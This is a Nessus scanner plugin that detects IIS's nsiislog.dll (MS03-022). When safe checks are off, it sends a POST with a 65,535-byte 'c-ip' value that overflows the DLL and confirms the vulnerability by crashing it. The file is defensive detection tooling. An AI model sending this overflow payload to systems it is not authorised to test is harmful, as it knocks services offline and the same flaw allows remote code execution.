# 
# (C) Tenable Network Security
#
#
# Supercedes MS03-019

if(description)
{
 script_id(11664);
 script_version ("$Revision: 1.6 $");
 script_cve_id("CAN-2003-0227", "CAN-2003-0349");
 script_bugtraq_id(8035);

 name["english"] = "nsiislog.dll DoS";

  
 script_name(english:name["english"]);
 
 desc["english"] = "
Some versions of IIS shipped with a default file, nsiislog.dll, 
within the /scripts directory.  Nessus has determined that the
remote host has the file installed. 

The NSIISLOG.dll CGI may allow an attacker to execute
arbitrary commands on this host, through a buffer overflow.

Solution : http://www.microsoft.com/technet/security/bulletin/ms03-022.asp

Risk Factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Determines the presence of nsiislog.dll";


 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");

 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";

 script_family(english:family["english"], francais:family["francais"]);
 
 script_dependencie("find_service.nes", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/iis");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;

req  = http_get(item:"/scripts/nsiislog.dll", port:port);
res  = http_keepalive_send_recv(port:port, data:req);
if("NetShow ISAPI Log Dll" >< res)
{
 if(safe_checks()) {
   security_hole(port);
   exit(0);
   }
  
  
  all = make_list("date", "time", "c-dns", "cs-uri-stem", "c-starttime", 
  		  "x-duration", "c-rate", "c-status", "c-playerid",
		  "c-playerversion", "c-player-language", "cs(User-Agent)",
		  "cs(Referer)", "c-hostexe");
		  
  poison = NULL;
  
  foreach var (all)
  {
   poison += var + "=Nessus&";
  }		 
   
  poison += "c-ip=" + crap(65535);
  
  req = string("POST /scripts/nsiislog.dll HTTP/1.1\r\n",
"Host: ", get_host_name(), "\r\n",
"User-Agent: NSPlayer/2.0\r\n",
"Content-Type: application/x-www-form-urlencoded\r\n",
"Content-Length: ", strlen(poison), "\r\n\r\n") + poison;

 soc = http_open_socket(port);
 if(!soc)exit(0);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);

 if("HTTP/1.1 500 Server Error" >< r &&
    "The remote procedure call failed. " >< r)security_hole(port);
}
